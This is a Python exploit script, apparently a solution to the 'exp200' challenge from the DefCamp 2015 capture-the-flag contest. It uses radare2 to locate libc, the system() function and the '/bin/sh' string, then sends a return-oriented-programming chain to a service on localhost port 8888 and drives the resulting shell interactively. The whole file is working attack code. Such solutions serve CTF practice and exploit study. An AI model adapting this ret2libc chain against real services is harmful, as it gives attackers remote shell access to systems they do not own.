import struct
import socket

import r2pipe

def rop(*args):
    return struct.pack('<Q'*len(args), *args)

r = r2pipe.open('exp200_defcamp2015_da61746febd7112be5b04437f6f17f5f0c37c384', ['-d'])
r.cmd('db main')  # break on main
r.cmd('dc')       # run!

libc_base = 0
libc_path = ''
for _map in r.cmdj('dmj'):
    if 'libc' in _map['file']:
        libc_base = _map['addr']
        libc_path = _map['file']
        break  # we want the first (lowest) address

print('[+] libc is %s' % libc_path)
print('[+] libc base at %s' % hex(libc_base))

system_addr = 0
r = r2pipe.open(libc_path)
for symbol in r.cmdj('isj'):
    if 'system' == symbol['name']:
        system_addr = symbol['paddr']

print('[+] system at %s' % hex(system_addr))

binsh_addr = r.cmdj('/j /bin/sh')[0]['offset']
print('[+] /bin/sh at %s' % hex(binsh_addr))

popret  = 0x0000004006a3
pop2ret = 0x0000004006a1

binsh = libc_base + binsh_addr
system = libc_base + system_addr

s = socket.create_connection(('localhost', 8888))

s.send(
        rop(pop2ret) +
        'A'*8 +
        'A'*8 +
        rop(popret) +
        rop(binsh) +
        rop(system) +
        '\n'
)

while True:
    s.send(raw_input('> ') + '\n')
    print s.recv(1024)
